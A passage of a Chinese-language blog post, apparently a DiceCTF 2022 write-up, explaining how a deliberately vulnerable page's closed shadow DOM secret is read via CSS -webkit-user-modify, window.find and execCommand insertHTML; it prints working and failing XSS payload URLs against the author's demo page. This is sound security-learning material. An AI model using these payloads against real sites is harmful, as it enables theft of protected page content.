          &lt;p>steal me :)&lt;/p>
          &lt;!-- secret: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>secret<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> -->
      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">;</span>
      <span class="token keyword">let</span> x <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> y <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      div<span class="token punctuation">.</span>style <span class="token operator">=</span> y<span class="token punctuation">;</span>
      shadow<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span><span class="token punctuation">;</span>
      secret <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      localStorage<span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span><span class="token string">"secret"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      shadow <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      div <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      
      <span class="token comment">// free XSS</span>
      window<span class="token punctuation">.</span>xss<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> x<span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>建立了一個 closed 的 shadow DOM，然後要你想辦法可以存取到裡面的內容。根據 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Element/attachShadow#parameters">MDN</a> 的說法，closed 的意思是：</p>
<blockquote>
<p>closed: Denies access to the node(s) of a closed shadow root from JavaScript outside it:</p>
</blockquote>
<p>所以用 JavaScript 沒辦法直接存取到程式碼，因為怎麼 query 都是 null。</p>
<p>因此這題的關鍵是特地留的一個 style injection：<code>div.style = y;</code>，你可以新增一些 CSS。</p>
<p>在做這題的時候我想說會不會是用 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Guide/Houdini">Houdini</a> 然後自己實作一些 CSS 的自訂屬性或是排版規則，就可以拿到 DOM，但因為 CSP 跟執行順序的關係，應該是沒有辦法。</p>
<p>後來因為這題太久都沒人解開，主辦單位釋出了一個提示：「Hint 1: non-standard css properties might help you」</p>
<p>看到這個之後我就去 Google：<code>non-standard css properties</code>，然後有找到這個：<a target="_blank" rel="noopener" href="https://gist.github.com/ryboe/bb95223148e486acbe7a">Non-standard and Obsolete CSS Properties</a>，並且實際去試了裡面幾個屬性，但都沒什麼幫助。</p>
<p>此時我突然好奇起 Chrome 到底支援哪些 CSS 屬性，於是就直接去找原始碼來看，找到這個：<a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/css/CSSProperties.in">https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/css/CSSProperties.in</a></p>
<p>（話說上面的是舊版，新版在這裡：<a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src.git/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/css/css_properties.json5">third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;css&#x2F;css_properties.json5</a>，相關說明在這裡：<a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src.git/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/style/ComputedStyle.md">third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;style&#x2F;ComputedStyle.md</a>）</p>
<p>我就一個一個看，看有沒有哪個比較特別的，就找到了 <code>-webkit-user-modify</code> 這個屬性，來看一下 MDN: <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/user-modify">https://developer.mozilla.org/en-US/docs/Web/CSS/user-modify</a></p>
<p>看起來這屬性就跟 <code>contenteditable</code> 差不多，既然變成 <code>contenteditable</code>，自然而然就會想到 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/API/Document/execCommand">document.execCommand</a>，而這裡面有個 <code>insertHTML</code> 的指令，看起來很有機會。</p>
<p>於是我就在 console 上面試了半天，試了像是 <code>document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img src=x onerror=console.log(this.parentNode)&#39;)</code> 之類的東西，但是 console 顯示出 <code>null</code>，我想說可能不是這個解吧，於是到這邊就放棄了。</p>
<p>看了賽後的 writeup：<a target="_blank" rel="noopener" href="https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md">https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md</a>，發現其實我的方向完全是正確的，只是有兩個關鍵點沒找到。</p>
<p>第一個關鍵點是要先 focus 那段文字再執行 insertHTML，這個我之前有試過 <code>.focus()</code> 但沒用，第二個關鍵點是要用 svg 才能成功。</p>
<p>先放一下成功的 payload：</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;svg&#x2F;onload&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>先用 <code>window.find</code> 去 focus 內容之後，再執行 <code>document.execCommand</code> 去插入 HTML，然後透過 <code>svg</code> 的 event 去執行 JS 拿到節點</p>
<p>底下是幾個會失敗的 payload：</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 沒有 focus
https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;svg&#x2F;onload&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt;

&#x2F;&#x2F; 用了不是 svg 的元素，會讀不到 this.parentNode
https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img&#x2F;src&#x3D;x+onerror&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但神奇的事情是，如果在前面先加上 <code>document.exec(&#39;selectAll&#39;)</code>，就可以：</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;selectAll&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img&#x2F;src&#x3D;x+onerror&#x3D;alert(this.parentNode.parentNode.innerHTML)&gt;&#39;)&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>為什麼會有這個差異呢？我也不知道，解出來的人似乎也不知道XD</p>
<p>除了學到 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Window/find">window.find</a> 這個神奇的 API 以外，從 Discord 的賽後討論也學到了另一個隱藏 API：<code>document.execCommand(&#39;findString&#39;, false, &#39;steal&#39;)</code>，他們說是從 Chromium source code 裡面看到的：<a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/editing/commands/editor_command_names.h#35">https://chromium.googlesource.com/chromium/src/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/editing/commands/editor_command_names.h#35</a></p>
<p>這邊留下三個坑，未來有機會再補：</p>
<ol>
<li>研究一下所有 <code>document.execCommand</code> 可以執行的指令</li>
<li>研究一下所有 global function</li>
<li>研究一下所有 Chrome 支援的 CSS 屬性</li>
</ol>
<h2><span id="總結">總結</span></h2><p>雖然 10 題裡面只打出 1 題 web，但還是收穫滿滿，筆記一下這次學到的新知識：</p>
<ol>
<li>Node.js 會把模組用 function 包起來</li>
<li>不能用 <code>import &quot;fs&quot;</code> 但可以用 <code>import(&quot;fs&quot;).then()</code></li>
<li>JS 有些字元轉大小或小寫之後長度會變</li>
<li><code>RegExp.input</code> 也就是 <code>RegExp.$_</code>，可以拿到最後比對的輸入</li>
<li><code>&lt;svg&gt;&lt;svg onload=alert()&gt;</code> 是同步執行的，這個真的神奇</li>
<li>可以把 connection pool 塞滿來執行 timing attack</li>
<li><code>-webkit-user-modify</code> 可以做到跟 <code>contenteditable</code> 差不多的事情</li>
<li><code>window.find</code> 跟 <code>document.execCommand(&#39;findString&#39;, false, &#39;steal&#39;)</code> 可以反白選取相對應字串</li>
</ol>
<p>感覺這次學到的技巧其他 CTF 也很有機會派上用場。</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Front-end/">#Front-end</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/JavaScript/">#JavaScript</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/02/09/javascript-runtime/">從「為什麼不能用這個函式」談執行環境（runtime）</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/02/02/origin-trials-try-new-feature/">透過 Chrome Origin Trials 搶先試用新功能</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">評論</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2025 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>繁體中文</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/02/08/en/what-i-learned-from-dicectf-2022/" class="dropdown-item">
                    English
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>